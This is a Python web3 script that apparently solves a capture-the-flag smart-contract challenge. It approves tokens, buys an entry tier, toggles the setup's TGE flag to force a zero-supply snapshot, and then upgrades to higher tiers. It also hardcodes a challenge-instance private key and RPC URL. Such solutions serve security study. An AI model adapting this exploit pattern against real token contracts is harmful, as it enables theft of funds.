from web3 import Web3
import sys
import time

# --- CONFIGURATION (Replace with active instance credentials) ---
RPC_URL = "http://challenges.1pc.tf:47009/9b27fd98-7e5a-4cf7-a576-a670edbb0c0f"
PRIVATE_KEY = "d7553ece054fe358ee7947b1423f26256520a4a6da102a02facd69f0323c6987"
SETUP_ADDRESS = "0xe521d89886Df1591E7146eA268273d11Bb9F0488"

# Connect to RPC
w3 = Web3(Web3.HTTPProvider(RPC_URL))
if not w3.is_connected():
    print("Failed to connect to RPC!")
    sys.exit()

account = w3.eth.account.from_key(PRIVATE_KEY)
player_address = account.address
print(f"Target Setup: {SETUP_ADDRESS}")
print(f"Player: {player_address}")

# ABIs
setup_abi = [
    {"inputs":[],"name":"token","outputs":[{"internalType":"contract Token","name":"","type":"address"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"tge","outputs":[{"internalType":"contract TGE","name":"","type":"address"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"internalType":"bool","name":"_tge","type":"bool"}],"name":"enableTge","outputs":[],"stateMutability":"public","type":"function"},
    {"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
]

tge_abi = [
    {"inputs":[],"name":"buy","outputs":[],"stateMutability":"external","type":"function"},
    {"inputs":[{"internalType":"uint256","name":"tier","type":"uint256"}],"name":"upgrade","outputs":[],"stateMutability":"external","type":"function"}
]

token_abi = [
    {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"public","type":"function"}
]

def send_tx(func_call, desc):
    print(f"\nProcessing: {desc}...")
    try:
        tx = func_call.build_transaction({
            'from': player_address,
            'nonce': w3.eth.get_transaction_count(player_address),
            'gas': 2000000,
            'gasPrice': w3.eth.gas_price
        })
        signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
        
        # Handle Web3.py v5 vs v6 compatibility
        try:
            raw_tx = signed_tx.raw_transaction
        except AttributeError:
            raw_tx = signed_tx.rawTransaction
            
        tx_hash = w3.eth.send_raw_transaction(raw_tx)
        print(f"  > Tx Hash: {tx_hash.hex()}")
        
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        if receipt.status == 1:
            print("  > Success!")
        else:
            print("  > Failed (Reverted)!")
            sys.exit()
    except Exception as e:
        print(f"  > Error: {e}")
        sys.exit()

def main():
    # 1. Initialize Contracts
    setup = w3.eth.contract(address=SETUP_ADDRESS, abi=setup_abi)
    token_addr = setup.functions.token().call()
    tge_addr = setup.functions.tge().call()
    
    token = w3.eth.contract(address=token_addr, abi=token_abi)
    tge = w3.eth.contract(address=tge_addr, abi=tge_abi)

    # 2. Approve TGE to spend tokens
    send_tx(token.functions.approve(tge_addr, 1000 * 10**18), "Approve Token")

    # 3. Buy Tier 1 (Entry)
    send_tx(tge.functions.buy(), "Buy Tier 1")

    # 4. Disable TGE (Trigger Snapshot: Supply Tier 2 & 3 = 0)
    send_tx(setup.functions.enableTge(False), "Disable TGE (Snapshot Trigger)")

    # 5. Re-enable TGE (Required for upgrade, snapshot remains 0)
    send_tx(setup.functions.enableTge(True), "Enable TGE")

    # 6. Upgrade Tier 2 (Balance 1 > Supply 0)
    send_tx(tge.functions.upgrade(2), "Upgrade to Tier 2")

    # 7. Upgrade Tier 3 (Balance 1 > Supply 0)
    send_tx(tge.functions.upgrade(3), "Upgrade to Tier 3")

    # 8. Check Win Condition
    if setup.functions.isSolved().call():
        print("\n[+] Challenge Solved! Retrieve flag from dashboard.")
    else:
        print("\n[-] Something went wrong.")

if __name__ == "__main__":
    main()
